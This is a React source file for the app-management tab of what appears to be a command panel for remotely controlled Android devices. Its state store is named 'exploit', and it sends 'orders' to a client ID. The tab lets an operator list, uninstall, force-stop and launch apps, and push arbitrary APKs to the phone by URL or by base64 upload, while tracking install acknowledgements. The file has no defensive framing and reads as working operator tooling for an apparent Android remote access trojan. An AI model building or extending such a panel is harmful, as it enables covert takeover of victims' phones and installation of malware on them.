
import { useState, useRef } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import {
  Package,
  RefreshCw,
  Trash2,
  SquarePower,
  Store,
  Rocket,
  Upload,
  Link2,
  CheckCircle2,
  Loader2,
} from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

// Apps tab — manage installed/launchable apps on the device, install APKs by
// URL or file, and watch the install lifecycle via the `acks` stream.
export function AppsTab({ clientId }: { clientId: string }) {
  const uninstallableApps = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.uninstallableApps ?? [],
  )
  const launchableApps = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.launchableApps ?? [],
  )
  const acks = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.acks ?? [],
  )

  // Install form state
  const [installUrl, setInstallUrl] = useState('')
  const [installName, setInstallName] = useState('')
  const [pkgName, setPkgName] = useState('')
  const fileInputRef = useRef<HTMLInputElement>(null)

  // Install lifecycle acks (most recent first)
  const installAcks = acks.filter(
    (a) =>
      a.type === 'install_started' ||
      a.type === 'install_result' ||
      a.type === 'install_perm_status',
  )

  // Field extractors (defensive — device payload shape varies)
  const getPkg = (a: any): string =>
    String(a?.pkg ?? a?.package ?? a?.packageName ?? a?.name ?? '')
  const getName = (a: any): string =>
    String(a?.name ?? a?.label ?? a?.appName ?? a?.title ?? '')
  const getIcon = (a: any): string | null =>
    typeof a?.icon === 'string' ? a.icon : null

  const handleInstallUrl = () => {
    if (!installUrl) return
    emitOrder(clientId, 'install_url', {
      url: installUrl,
      name: installName || undefined,
    })
  }

  const handleInstallFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = () => {
      const result = reader.result as string
      // strip the "data:application/vnd.android.package-archive;base64," prefix
      const base64 = result.includes(',')
        ? result.split(',').slice(1).join(',')
        : result
      emitOrder(clientId, 'install_apk', {
        data: base64,
        name: installName || file.name,
      })
      if (fileInputRef.current) fileInputRef.current.value = ''
    }
    reader.readAsDataURL(file)
  }

  return (
    <div className="space-y-5">
      <div className="flex items-center gap-2">
        <Package className="h-4 w-4 text-emerald-400" />
        <h3 className="text-sm font-semibold text-zinc-100">App Manager</h3>
      </div>

      {/* Section 1: Installed apps */}
      <Section
        title="Installed Apps"
        icon={Package}
        action={
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'list_apps')}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <RefreshCw className="h-3.5 w-3.5" /> List apps
          </Button>
        }
      >
        <div className="max-h-72 overflow-y-auto scrollbar-emerald divide-y divide-white/5 rounded-lg border border-white/10">
          {uninstallableApps.length === 0 ? (
            <div className="px-3 py-8 text-center text-xs text-zinc-600">
              Tap "List apps" to enumerate installed packages.
            </div>
          ) : (
            uninstallableApps.map((app: any, i: number) => {
              const pkg = getPkg(app)
              const name = getName(app)
              const icon = getIcon(app)
              return (
                <div
                  key={i}
                  className="flex items-center gap-2 px-3 py-2 hover:bg-white/[0.03] flex-wrap"
                >
                  <span className="grid h-6 w-6 place-items-center rounded bg-emerald-500/10 text-[10px] font-mono text-emerald-300 ring-1 ring-emerald-500/20 shrink-0">
                    {icon ? (
                      <img
                        src={icon}
                        alt=""
                        className="h-6 w-6 rounded object-contain"
                      />
                    ) : (
                      name.charAt(0).toUpperCase() || '?'
                    )}
                  </span>
                  <div className="min-w-0 flex-1">
                    {name && (
                      <div className="text-xs text-zinc-200 truncate">{name}</div>
                    )}
                    <div className="text-[10px] font-mono text-zinc-500 truncate">
                      {pkg}
                    </div>
                  </div>
                  <div className="flex gap-1 shrink-0">
                    <IconBtn
                      title="Uninstall"
                      onClick={() => emitOrder(clientId, 'uninstall', { package: pkg })}
                      className="text-rose-300 hover:text-rose-200"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </IconBtn>
                    <IconBtn
                      title="Force stop"
                      onClick={() => emitOrder(clientId, 'force_stop', { package: pkg })}
                    >
                      <SquarePower className="h-3.5 w-3.5" />
                    </IconBtn>
                    <IconBtn
                      title="Open Play Store"
                      onClick={() => emitOrder(clientId, 'open_play_store', { package: pkg })}
                    >
                      <Store className="h-3.5 w-3.5" />
                    </IconBtn>
                  </div>
                </div>
              )
            })
          )}
        </div>
      </Section>

      {/* Section 2: Launchable apps */}
      <Section
        title="Launchable Apps"
        icon={Rocket}
        action={
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'list_launchable')}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <RefreshCw className="h-3.5 w-3.5" /> List launchable
          </Button>
        }
      >
        <div className="max-h-72 overflow-y-auto scrollbar-emerald divide-y divide-white/5 rounded-lg border border-white/10">
          {launchableApps.length === 0 ? (
            <div className="px-3 py-8 text-center text-xs text-zinc-600">
              Tap "List launchable" to enumerate launchable apps.
            </div>
          ) : (
            launchableApps.map((app: any, i: number) => {
              const pkg = getPkg(app)
              const name = getName(app)
              const icon = getIcon(app)
              return (
                <div
                  key={i}
                  className="flex items-center gap-2 px-3 py-2 hover:bg-white/[0.03]"
                >
                  <span className="grid h-6 w-6 place-items-center rounded bg-emerald-500/10 text-[10px] font-mono text-emerald-300 ring-1 ring-emerald-500/20 shrink-0">
                    {icon ? (
                      <img
                        src={icon}
                        alt=""
                        className="h-6 w-6 rounded object-contain"
                      />
                    ) : (
                      name.charAt(0).toUpperCase() || '?'
                    )}
                  </span>
                  <div className="min-w-0 flex-1">
                    {name && (
                      <div className="text-xs text-zinc-200 truncate">{name}</div>
                    )}
                    <div className="text-[10px] font-mono text-zinc-500 truncate">
                      {pkg}
                    </div>
                  </div>
                  <Button
                    size="sm"
                    onClick={() => emitOrder(clientId, 'launch_app', { package: pkg })}
                    className="h-7 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
                  >
                    <Rocket className="h-3 w-3" /> Launch
                  </Button>
                </div>
              )
            })
          )}
        </div>
      </Section>

      {/* Section 3: Install APK */}
      <Section title="Install APK" icon={Upload}>
        <div className="space-y-3">
          <div className="flex gap-2 items-end">
            <div className="flex-1 space-y-1">
              <Label className="text-[10px] uppercase tracking-wider text-zinc-500">
                Package name (optional)
              </Label>
              <Input
                value={pkgName}
                onChange={(e) => setPkgName(e.target.value)}
                placeholder="com.example.app"
                className="bg-black/40 border-white/10 font-mono text-xs h-8"
              />
            </div>
          </div>

          <div className="flex gap-2 items-end">
            <div className="flex-1 space-y-1">
              <Label className="text-[10px] uppercase tracking-wider text-zinc-500">
                Install by URL
              </Label>
              <Input
                value={installUrl}
                onChange={(e) => setInstallUrl(e.target.value)}
                placeholder="https://example.com/app.apk"
                className="bg-black/40 border-white/10 font-mono text-xs h-8"
              />
            </div>
            <Button
              onClick={handleInstallUrl}
              disabled={!installUrl}
              size="sm"
              className="h-8 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
            >
              <Link2 className="h-3.5 w-3.5" /> Install
            </Button>
          </div>

          <div className="flex gap-2 items-end">
            <div className="flex-1 space-y-1">
              <Label className="text-[10px] uppercase tracking-wider text-zinc-500">
                Install by file
              </Label>
              <Input
                ref={fileInputRef}
                type="file"
                accept=".apk,application/vnd.android.package-archive"
                onChange={handleInstallFile}
                className="bg-black/40 border-white/10 font-mono text-xs h-8 file:bg-emerald-500/15 file:text-emerald-300 file:border-0 file:rounded file:px-2 file:mr-2 file:cursor-pointer"
              />
            </div>
          </div>

          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'check_install_perm')}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <CheckCircle2 className="h-3.5 w-3.5" /> Check install permission
          </Button>

          {/* Install lifecycle */}
          <div className="rounded-lg border border-white/10 bg-black/30 p-2 max-h-32 overflow-y-auto scrollbar-emerald space-y-1">
            {installAcks.length === 0 ? (
              <div className="px-3 py-4 text-center text-[11px] text-zinc-600">
                No install activity yet.
              </div>
            ) : (
              installAcks.slice(0, 10).map((a, i) => (
                <div
                  key={i}
                  className="flex items-center gap-2 rounded px-2 py-1 text-[11px] hover:bg-white/[0.03]"
                >
                  {a.type === 'install_started' ? (
                    <Loader2 className="h-3 w-3 animate-spin text-emerald-400" />
                  ) : (
                    <CheckCircle2 className="h-3 w-3 text-emerald-400/70" />
                  )}
                  <span className="text-zinc-500 shrink-0">{a.time}</span>
                  <span className="text-emerald-300 font-mono shrink-0">
                    {a.type}
                  </span>
                  <span className="text-zinc-400 truncate font-mono">
                    {JSON.stringify(a.payload).slice(0, 120)}
                  </span>
                </div>
              ))
            )}
          </div>
        </div>
      </Section>
    </div>
  )
}

function Section({
  title,
  icon: Icon,
  action,
  children,
}: {
  title: string
  icon: typeof Package
  action?: React.ReactNode
  children: React.ReactNode
}) {
  return (
    <div className="rounded-xl border border-white/10 bg-zinc-900/40 p-4 space-y-3">
      <div className="flex items-center justify-between gap-2">
        <div className="flex items-center gap-2 text-xs uppercase tracking-wider text-zinc-500">
          <Icon className="h-3.5 w-3.5 text-emerald-400/80" />
          {title}
        </div>
        {action}
      </div>
      {children}
    </div>
  )
}

function IconBtn({
  title,
  onClick,
  className = '',
  children,
}: {
  title: string
  onClick: () => void
  className?: string
  children: React.ReactNode
}) {
  return (
    <Button
      variant="outline"
      size="sm"
      title={title}
      onClick={onClick}
      className={`h-7 w-7 p-0 bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 ${className}`}
    >
      {children}
    </Button>
  )
}
